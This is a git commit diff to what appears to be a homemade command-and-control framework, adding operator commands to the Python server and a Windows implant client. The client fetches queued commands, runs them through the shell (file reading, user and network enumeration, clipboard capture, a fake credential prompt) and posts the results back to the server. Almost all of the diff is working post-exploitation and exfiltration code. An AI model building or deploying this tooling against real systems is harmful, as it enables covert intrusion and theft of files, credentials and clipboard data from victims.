b58a1718c1bf4be7a3a6a8ad3831e292bb497f67
Maximilien Schmitt-Laurin <maximilien.schmittlaurin@protonmail.com>
2022-03-18 00:00:19 -0400

    Add a few commands that the operator can now queue for execution on the client

--- C2Server.py
+++ C2Server.py
@@ -3,6 +3,7 @@
 from aiohttp import web
 from datetime import datetime
 import sys
+from subprocess import PIPE, run
 
 
 # Empty dictionary that will hold the C2 post exploitation commands
@@ -18,6 +19,11 @@ async def InitCall(request):
 
 
 
+# This function is where the process of the operator entering C2 commands for the
+# target client host starts. When the operator enters the 'done' command, all of 
+# the commands entered by the operator (stored in the cmds dictionary) are
+# returned to the client in the body of the HTTP response.
+
 async def CheckIn(request):
 
     cmds.clear()
@@ -30,11 +36,10 @@ async def CheckIn(request):
 
     host, port = peername
 
-    cmdCounter = 0
-    count2 = 0
+    cmdcounter = 0
     test = 'OK'
 
-    print("\n\n Type 'help' to learn more about the built-in commands.\n\n")
+    print("\n\n Type 'help' to learn more about the built-in commands.\n")
 
     while True:
 
@@ -49,28 +54,287 @@ async def CheckIn(request):
             print("\n Help menu :")
             print("\n ---> ALIASES <---\n\n")
             print(" > systeminfo : Return useful system information\n")
-            print(" > cd [directory] : Cd to the directory specified (ex: cd /home)\n")
-            print(" > listdir : List files and directories\n")
+            print(" > ls [directory] : List files and directories at a specific path\n")
+            print(" > cat [filename] : View content of a specified file\n")
             print(" > download [filename] : After you cd to directory of interest, download files of interest (one at a time)\n")
-            print(" > listusers : List users \n")
-            print(" > addresses : List internal address(es) for this host\n")
+            print(" > listusers : List local user accounts \n")
+            print(" > ipconfig : Display the network configuration, refresh DHCP and DNS settings.\n")
+            print(" > whoami : Show the host name and the user\n")
             print(" > lcwd : Show current server working directory\n")
             print(" > pwd : Show working directory on host\n")
             print("")
             print("\n ---> COMMANDS <---\n\n")
-            print(" > prompt : Propmpt the user to enter credentials\n")
+            print(" > prompt : Prompt the user to enter credentials\n")
             print(" > userhist : Grep for interesting hosts from bash history\n")
             print(" > clipboard : Grab text in the user's clipboard\n")
             print(" > connections : Show active network connections\n")
-            print(" > checksecurity : Search for common Endpoint Detection and Response (EDR) products\n")
             print(" > screenshot : Grap a screenshot of the host\n")
             print(" > sleep [digit] : Change sleep time\n")
             print(" > shell [shell command] : Run a shell command... NOT OPSEC SAFE, as this uses easily detectable command line strings.\n")
             print("")
-            print("\n ---> OTHER <---\n\n")
+            print("\n ---> OTHERS <---\n\n")
+            print(" > done : Return all of the commands that were previously entered to the target client.\n")
             print(" > exit : Exit the session and stop the client\n")
             print("-"*100)
             print("")
+
+        elif 'exit' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+        
+        elif 'lcwd' in command:
+
+            print("\n Current server working directory:")
+            result = run('cd', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+            print(" " + result.stdout)
+        
+        elif (('pwd' in command) and ('shell' not in command)):
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif (('cat' in command) and ('shell' not in command)):
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'ls' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'whoami' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'connections' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif (('cd ' in command) and ('shell' not in command)):
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'ipconfig' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'listusers' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'userhist' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'screenshot' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'download ' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'prompt' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'systeminfo' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'clipboard' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'shell ' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif 'sleep ' in command:
+
+            cmdcounter = cmdcounter + 1
+            cmds["'%s'"%str(cmdcounter)] = command
+            print("\n %s queued for execution on the endpoint at next checkin" % command)
+
+        elif command == 'done':
+
+            datalist = list(cmds.values())
+            return web.json_response(datalist)
+            break
+
+        else:
+            print("[-] Command not found")
+
+    return web.Response(text=text)
+
+
+# Server displays the results for each instruction executed on the target client
+# to the operator with the following functions.
+
+async def GetPath(request):
+
+    path = await request.read()
+    path = str(path).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Current directory path: %s" % str(path))
+    text = 'OK'
+
+    return web.Response(text=text)
+
+
+async def Whoami(request):
+
+    wdata = await request.read()
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Current user identity: %s" % str(wdata.decode('utf8')))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def ListDir(request):
+
+    listinfo = await request.read()
+    listinfo = str(listinfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Results: \n")
+    print("%s" % str(listinfo))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def ChangeDir(request):
+
+    pathinfo = await request.read()
+    timestmp = datetime.now()
+    print("Timestamp: %s" % str(timestmp))
+    print("[+] %s" % str(pathinfo))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def SysInfo(request):
+
+    sysInfoData = await request.read()
+    sysInfoData = str(sysInfoData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Basic system info: \n")
+    print("%s" % str(sysInfoData))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def CatFile(request):
+
+    fileData = await request.read()
+    fileData = str(fileData).replace("b'", "").replace("\\\\", "\\").replace("\\'", "'").replace('\\n', '\n')
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Content of the file: \n")
+    print("%s" % str(fileData))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def ListUsers(request):
+
+    listUsersInfo = await request.read()
+    listUsersInfo = str(listUsersInfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Local User Accounts Found: \n")
+    print("%s" % str(listUsersInfo))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def IpConfig(request):
+
+    ipConfigInfo = await request.read()
+    ipConfigInfo = str(ipConfigInfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Ipconfig Info: \n")
+    print("%s" % str(ipConfigInfo))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def Clipboard(request):
+
+    clipboard = await request.read()
+    clipboard = str(clipboard).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Clipboard: \n")
+    print(" %s" % str(clipboard))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def ConnData(request):
+
+    connData = await request.read()
+    connData = str(connData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Active Connections: \n")
+    print(" %s" % str(connData))
+    text = 'OK'
+    return web.Response(text=text)
+
+
+async def Prompt(request):
+
+    promptData = await request.read()
+    promptData = str(promptData).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")
+
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] Prompt Data : \n")
+    print(" %s" % str(promptData))
+    text = 'OK'
+    return web.Response(text=text)
+
 
 
 
@@ -89,23 +353,21 @@ app.add_routes([
     web.get('/initialize/sequence/0', InitCall),
     web.get('/validate/status', CheckIn),
     #web.post('/validate/status/1', GetScreenshot),
-    #web.post('/validate/status/2', GetDownload),
-    #web.post('/validate/status/3', GetPath),
+    #web.get('/validate/status/2', GetDownload),
+    web.post('/validate/status/3', GetPath),
     #web.post('/validate/status/4', ChangeDir),
-    #web.post('/validate/status/5', ListDir),
-    #web.post('/validate/status/6', Clipboard),
-    #web.post('/validate/status/7', Prompt),
-    #web.post('/validate/status/8', ConnData),
-    #web.post('/validate/status/9', Addresses),
-    #web.post('/validate/status/10', ListUsers),
+    web.post('/validate/status/5', ListDir),
+    web.post('/validate/status/6', Clipboard),
+    web.post('/validate/status/7', Prompt),
+    web.post('/validate/status/8', ConnData),
+    web.post('/validate/status/9', IpConfig),
+    web.post('/validate/status/10', ListUsers),
     #web.post('/validate/status/11', UserHist),
-    #web.post('/validate/status/12', CheckSecurity),
-    #web.post('/validate/status/13', Whoami),
-    #web.post('/validate/status/14', SysInfo),
-    #web.post('/validate/status/15', CatFile),
+    web.post('/validate/status/13', Whoami),
+    web.post('/validate/status/14', SysInfo),
+    web.post('/validate/status/15', CatFile),
     #web.post('/validate/status/16', ShellCmd),
     #web.post('/validate/status/17', Sleeper),
-    #web.post('/validate/status/18', Persist),
 ])
 
 
--- TargetClient.py
+++ TargetClient.py
@@ -4,13 +4,114 @@ from datetime import datetime
 import aiohttp
 import asyncio
 import sys
+import json
+from subprocess import PIPE, run
 
 
 async def main():
+
     async with aiohttp.ClientSession() as session:
+
+        # Client makes a GET request for instructions (will hit an endpoint on the server).
+
         async with session.get('http://127.0.0.1:7000/validate/status') as resp:
+
             print(resp.status)
-            print(await resp.text())
+
+            # Server returns C2 instructions from the operator.
+
+            jsonStr = await resp.text()
+            cmds = json.loads(jsonStr)
+
+
+            # Client executes each instruction one by one and then sends the result
+            # to the server.
+
+            for command in cmds:
+
+                if command == "pwd" or command == "cd":
+
+                    result = run('cd', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/3', data=result.stdout)
+                
+                if command == "whoami":
+
+                    result = run('whoami', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/13', data=result.stdout)
+
+                if command == "ls":
+
+                    result = run('dir', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/5', data=result.stdout)
+
+                if 'ls' in command and command != "ls":
+
+                    commandKeywordList = command.split()
+                    path = commandKeywordList[1]
+
+                    powershellCommand = "dir " + path
+                    result = run(powershellCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/5', data=result.stdout)
+
+                      
+                if command == "systeminfo":
+
+                    result = run('systeminfo', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/14', data=result.stdout)
+
+
+                if 'cat' in command and command != "cat":
+
+                    commandKeywordList = command.split()
+                    filename = commandKeywordList[1]
+
+                    powershellCommand = "type " + filename
+                    result = run(powershellCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/15', data=result.stdout)
+
+
+                if command == "listusers":
+
+                    result = run('net user', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/10', data=result.stdout)
+
+
+                if command == "ipconfig":
+
+                    result = run('ipconfig /all', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/9', data=result.stdout)
+
+
+                if command == "clipboard":
+
+                    result = run('powershell get-clipboard', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/6', data=result.stdout)
+
+
+                if command == "connections":
+
+                    result = run('netstat -a', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+                    await session.post('http://127.0.0.1:7000/validate/status/8', data=result.stdout)
+
+
+                if command == "prompt":
+
+                    promptData = input(" Enter some credentials here : ")
+                    await session.post('http://127.0.0.1:7000/validate/status/7', data=promptData)
+
+
+    await main()
+
 
 if __name__ ==  '__main__':
     asyncio.run(main())
